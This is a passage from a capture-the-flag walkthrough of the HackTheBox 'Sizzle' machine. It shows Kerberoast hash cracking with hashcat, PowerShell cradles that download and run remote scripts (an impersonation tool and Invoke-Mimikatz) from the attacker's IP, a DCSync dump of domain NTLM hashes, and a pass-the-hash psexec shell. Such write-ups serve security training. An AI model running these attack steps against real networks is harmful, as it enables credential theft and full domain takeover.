                       0918E4CBA7093A5338CA7E8F969FDA17312B7B872F61F71AD00ED02B8510433E09C20CD8B40
                       D0BB156A2B85246584A015063F2763C8D07ACF3B6601DABB3990BDAE787F4A860BAD6A97760
                       D0C2422258AFB339708B43431F329AE42F856301E2AD4090A5B3169D9AEADC921E3001B02B6
                       B9ADA093AC9C9AC1572E0461D736A787D8E0BE9CD018701D2C0DDCDB292CBFD7072F8FBEAFB
                       52E371FCF543642D6CC8BA401E6900E2AB8D061B6625C2125313800D70C4F4F9D49C70AA26C
                       DDD8E94CFBC78B3E6195986C0A5B923EDAE57DF46AD558C41CA2A96F545F361CE46153005F4
                       10EC8A51D664E857B9BFD6F7638A674AD68FC75FCE6CC4CFDBF419F34D4FB3F6DD133E231DA
                       9AC7AF6BADFC6CE47FDD9FF7D44F33C369EB19CD88B96405F306CFD7E8595F7FC93C862D47D
                       14F64374D2BA47FC2BF7F8AFC849D44A0C5F4E81CAD6BA2A8E05E8FAAE92D1DB39C9D1F4AB5
                       2C92920C921E88E011F2EC7054F6510FF67EE526BE8202AE8CF5FB6A51BF455DC4AC072836E
                       9ECA7C2629C09B578108350182958444836719FF0A953E63BA56D6EB7646DC16B3FBC8EA7D9
                       96203867D985300DFF8A31C6E4DDF2BB5709F1820B0351309B8DDC7BC7F34F1CA0A74080726
                       2223BFE15ED6222D4CCEED2AD54D398215B422BFFD844B5F7D24E787DE27C2376B89C068287
                       B032DB4B92DD54DEB9BF5A405424D0A92ECB70F073CA29311B5526B32769CE351A3E03F2441
                       DF47636AB0AEE58BF0E53FCE31AC9EA49D652B1F730C3F1C025DA3280A76ED48A44B8FF2888
                       52D24FE72D8CC6A75B7D7AA4C813071B03A0368898340C9FAC99123040C0A312FD00D120B08
                       5F864710746109EC47DF98ED4BC30747508A70E7EB73426CA45D27308F8BDB80AA88734093C
                       4C32DF27797F1FBA070506480B39E30BD532D388D9372CB7364BB75AC84D6F6977E0AA862D9
                       FA53F98FBF6A74C6AC9D687D96F8C4736519245667D147AFE83F821651F19E06F29F6ECF07D
                       85FAE9A8A52F33FD9E438505A2B4F3AA5D32713CC41D45655169AD9E8312EA597AD95A1C97F
                       8FB5661A273D1C221D637C3C489212A2F2421E964EF84AA0FC03E6797655284DA3EC8527A4B
                       66E5578EA92B8A64F894077E07B73045025216C8169143BB7EF5D8B7F6E1AF75B3EF60704D8
                       2654CECF944B65284A36C311F250C2259420440A5223D5342A78C2FEDBAA5AD153629E42E7F
                       F72A213862401999E711701025207D4BB9F6666CDE8B5D478EFA9239E2B26DCF4584FEE225B
                       807CEDAB672303313B82310687B967E50957EC


PS C:\Users\amanda\Documents>
```

### Hash Crack

```sh
┌──(pl4stic㉿kali)-[~/htb/sizzle]
└─$ hashcat mrlky-hash.txt /usr/share/wordlists/rockyou.txt
hashcat (v6.2.6) starting in autodetect mode
[...snip...]
$krb5tgs$23$*mrlky$HTB.LOCAL$http/sizzle*$75e173da4709d562130584227ca4f1ee$fdf6ab981ce096adc09c3254d911e46457c918af70d96c807efa8ee36a98d407baf8bd7ec600664a85b971c9800d94bd8f556f8c6ba66670f6eeebbc5cf7249c0b0ba189963f9af06358780918e4cba7093a5338ca7e8f969fda17312b7b872f61f71ad00ed02b8510433e09c20cd8b40d0bb156a2b85246584a015063f2763c8d07acf3b6601dabb3990bdae787f4a860bad6a97760d0c2422258afb339708b43431f329ae42f856301e2ad4090a5b3169d9aeadc921e3001b02b6b9ada093ac9c9ac1572e0461d736a787d8e0be9cd018701d2c0ddcdb292cbfd7072f8fbeafb52e371fcf543642d6cc8ba401e6900e2ab8d061b6625c2125313800d70c4f4f9d49c70aa26cddd8e94cfbc78b3e6195986c0a5b923edae57df46ad558c41ca2a96f545f361ce46153005f410ec8a51d664e857b9bfd6f7638a674ad68fc75fce6cc4cfdbf419f34d4fb3f6dd133e231da9ac7af6badfc6ce47fdd9ff7d44f33c369eb19cd88b96405f306cfd7e8595f7fc93c862d47d14f64374d2ba47fc2bf7f8afc849d44a0c5f4e81cad6ba2a8e05e8faae92d1db39c9d1f4ab52c92920c921e88e011f2ec7054f6510ff67ee526be8202ae8cf5fb6a51bf455dc4ac072836e9eca7c2629c09b578108350182958444836719ff0a953e63ba56d6eb7646dc16b3fbc8ea7d996203867d985300dff8a31c6e4ddf2bb5709f1820b0351309b8ddc7bc7f34f1ca0a740807262223bfe15ed6222d4cceed2ad54d398215b422bffd844b5f7d24e787de27c2376b89c068287b032db4b92dd54deb9bf5a405424d0a92ecb70f073ca29311b5526b32769ce351a3e03f2441df47636ab0aee58bf0e53fce31ac9ea49d652b1f730c3f1c025da3280a76ed48a44b8ff288852d24fe72d8cc6a75b7d7aa4c813071b03a0368898340c9fac99123040c0a312fd00d120b085f864710746109ec47df98ed4bc30747508a70e7eb73426ca45d27308f8bdb80aa88734093c4c32df27797f1fba070506480b39e30bd532d388d9372cb7364bb75ac84d6f6977e0aa862d9fa53f98fbf6a74c6ac9d687d96f8c4736519245667d147afe83f821651f19e06f29f6ecf07d85fae9a8a52f33fd9e438505a2b4f3aa5d32713cc41d45655169ad9e8312ea597ad95a1c97f8fb5661a273d1c221d637c3c489212a2f2421e964ef84aa0fc03e6797655284da3ec8527a4b66e5578ea92b8a64f894077e07b73045025216c8169143bb7ef5d8b7f6e1af75b3ef60704d82654cecf944b65284a36c311f250c2259420440a5223d5342a78c2fedbaa5ad153629e42e7ff72a213862401999e711701025207d4bb9f6666cde8b5d478efa9239e2b26dcf4584fee225b807cedab672303313b82310687b967e50957ec:Football#7
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 13100 (Kerberos 5, etype 23, TGS-REP)
Hash.Target......: $krb5tgs$23$*mrlky$HTB.LOCAL$http/sizzle*$75e173da4...0957ec
Time.Started.....: Wed Feb 26 00:23:27 2025 (4 secs)
Time.Estimated...: Wed Feb 26 00:23:31 2025 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
```

And now we've got a new set of credentials: `HTB.local\mrlky:Football#7`

### Impersonate mrlky

I wasn't able to use `mrlky`'s credentials to connect to the machine with WinRM, or the other standard methods such as PSExec, WMIExec, etc.  Let's use another PowerShell script to change user to `mrlky` by impersonating him as Amanda. [Script here](https://github.com/Hackplayers/PsCabesha-tools/blob/master/Privesc/Impersonaliza-User.ps1).

```PowerShell
PS C:\Users\amanda\Documents>IEX(New-Object Net.Webclient).downloadString('http://10.10.14.142/Impersonaliza-User.ps1')
PS C:\Users\amanda\Documents> Impersonaliza-User -usuario mrlky -password Football#7 -dominio HTB.LOCAL
0
True
```

Don't forget to grab `user.txt` from `C:\Users\mrlky\Desktop`

## Shell as mrlky

![sizzle7](/images/sizzle7.png)

Let's take a look back at Bloodhound and see what `mrlky` can do on the domain. With the `DCSync` permissions, BloodHound gives us the path to privilege escalation. Looks easy enough... `mimikatz` for the win!

![sizzle8](/images/sizzle8.png)

We'll use `Invoke-Mimikatz.ps1`, found [here](https://github.com/PowershellMafia/Powersploit/blob/master/Exfiltration/Invoke-Mimikatz.ps1), for this one.

```PowerShell
PS C:\Users\mrlky\Desktop> IEX(New-Object Net.Webclient).downloadString('http://10.10.14.142/Invoke-Mimikatz.ps1')
PS C:\Users\mrlky\Desktop> Invoke-Mimikatz -Command '"Lsadump::dcsync /domain:HTB.LOCAL /user:Administrator"'

  .#####.   mimikatz 2.1 (x64) built on Nov 10 2016 15:31:14
 .## ^ ##.  "A La Vie, A L'Amour"
 ## / \ ##  /* * *
 ## \ / ##   Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 '## v ##'   http://blog.gentilkiwi.com/mimikatz             (oe.eo)
  '#####'                                     with 20 modules * * */

mimikatz(powershell) # Lsadump::dcsync /domain:HTB.LOCAL /user:Administrator
[DC] 'HTB.LOCAL' will be the domain
[DC] 'sizzle.HTB.LOCAL' will be the DC server
[DC] 'Administrator' will be the user account

Object RDN           : Administrator

** SAM ACCOUNT **

SAM Username         : Administrator
Account Type         : 30000000 ( USER_OBJECT )
User Account Control : 00000200 ( NORMAL_ACCOUNT )
Account expiration   : 
Password last change : 7/12/2018 12:32:41 PM
Object Security ID   : S-1-5-21-2379389067-1826974543-3574127760-500
Object Relative ID   : 500

Credentials:
  Hash NTLM: f6b7160bfc91823792e0ac3a162c9267
    ntlm- 0: f6b7160bfc91823792e0ac3a162c9267
    ntlm- 1: c718f548c75062ada93250db208d3178
    lm  - 0: 336d863559a3f7e69371a85ad959a675

[...snip...]
```

## Shell as Administrator

Now that we have the administrator hash, we can dump the NTLM and then login using `wmiexec` and grab the `root.txt`

```sh
┌──(pl4stic㉿kali)-[~/htb/sizzle]
└─$ impacket-secretsdump htb.local/administrator@10.129.124.103 -hashes :f6b7160bfc91823792e0ac3a162c9267 -just-dc-ntlm
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:f6b7160bfc91823792e0ac3a162c9267:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:296ec447eee58283143efbd5d39408c8:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
amanda:1104:aad3b435b51404eeaad3b435b51404ee:7d0516ea4b6ed084f3fdf71c47d9beb3:::
mrlky:1603:aad3b435b51404eeaad3b435b51404ee:bceef4f6fe9c026d1d8dec8dce48adef:::
sizzler:1604:aad3b435b51404eeaad3b435b51404ee:d79f820afad0cbc828d79e16a6f890de:::
SIZZLE$:1001:aad3b435b51404eeaad3b435b51404ee:e998d6b01fc22017e88b4e3dd59ed5c3:::
[*] Cleaning up...
```

```sh
┌──(pl4stic㉿kali)-[~/htb/sizzle]
└─$ impacket-psexec htb.local/administrator@10.129.124.103 -hashes :f6b7160bfc91823792e0ac3a162c9267                   
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Requesting shares on 10.129.124.103.....
[*] Found writable share ADMIN$
[*] Uploading file iTiinPYg.exe
[*] Opening SVCManager on 10.129.124.103.....
[*] Creating service rUhT on 10.129.124.103.....
[*] Starting service rUhT.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\Windows\system32>
```